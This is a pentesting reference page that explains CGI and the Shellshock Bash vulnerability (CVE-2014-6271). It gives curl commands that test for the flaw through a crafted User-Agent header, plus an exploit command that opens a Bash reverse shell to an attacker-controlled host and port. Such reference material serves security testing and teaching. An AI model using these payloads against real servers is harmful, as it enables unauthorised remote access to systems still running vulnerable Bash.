---
menu: CGI
title: CGI - Web Applications Pentesting
---

# Common Gateway Interface

## At a Glance

Common Gateway Interface (CGI) is an interface specification for web servers to execute command-line interface (CLI) programs. These programs also known as CGI scripts or simply CGIs, are commonly executed at the time a request is made and return dynamically generated HTML content.

Most servers expect CGI scripts to reside in a special directory, usually called `cgi-bin`, to handle the requests correctly and execute the program instead of returning the file content.  [^oreilly-cgi]

## Shellshock

Shellshock ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)) is an Arbitrary Code Execution (ACE) vulnerability that affects Linux and Unix command-line shell, aka the GNU Bourne Again Shell.

GNU Bourne Again Shell, or Bash, is an interpreter that allows users to send commands on Unix and Linux systems, typically by connecting over SSH or Telnet but it can also operate as a parser for CGI scripts.

{{<note>}}
In addition to CGI-based web servers, it also affects OpenSSH servers, DHCP clients, Qmail servers and restricted shells of the IBM Hardware Management Console (IBM HMC)
{{</note>}}

The vulnerability occurs when the variables sent to the server, are passed and interpreted by Bash. This variable involves a specially crafted environment variable containing an exported function definition, followed by arbitrary commands. Bash incorrectly executes the trailing commands when it imports the function.


```
Environment variable with
function definition                          Expected command
         +                                          +
         |                                          |
+--------+--------+ +----------------+ +------------+--------------+
| env x='() { :;};| |echo vulnerable'| |bash -c "echo Real command"|
+-----------------+ +-------+--------+ +---------------------------+
                            |
                            +
            Arbitrary command executed by Bash
```

### Test

#### Reflected

```sh
curl -fs -H "user-agent: () { :; }; echo; echo 'vulnerable'" http://{{< param "war.rhost" >}}/cgi-bin/vulnerable | grep vulnerable
```

#### Blind

```sh
curl -fs -H "user-agent: () { :; }; /bin/bash -c 'sleep 5'" http://{{< param "war.rhost" >}}/cgi-bin/vulnerable
```

{{<details "Parameters">}}
- `-f`: fail silently on HTTP errors.
- `-s`: silent mode.
- `-H`: pass custom header(s) to server.
{{</details>}}

### Exploit

```sh
curl -fs -H "user-agent: () { :; }; /bin/bash -i >& /dev/tcp/{{< param "war.lhost" >}}/{{< param "war.lport" >}} 0>&1" http://{{< param "war.rhost" >}}/cgi-bin/vulnerable
```

## Further Reading

- [Inside Shellshock: How hackers are using it to exploit systems](https://blog.cloudflare.com/inside-shellshock/)
- [Wikipedia - Shellshock (software bug)](https://en.wikipedia.org/wiki/Shellshock_(software_bug))

[^oreilly-cgi]: Gundavaram, Shishir. “The Common Gateway Interface (CGI).” O’Reilly Media - Technology and Business Training, O’Reilly & Associates, Inc., https://www.oreilly.com/openbook/cgi/ch01_01.html.
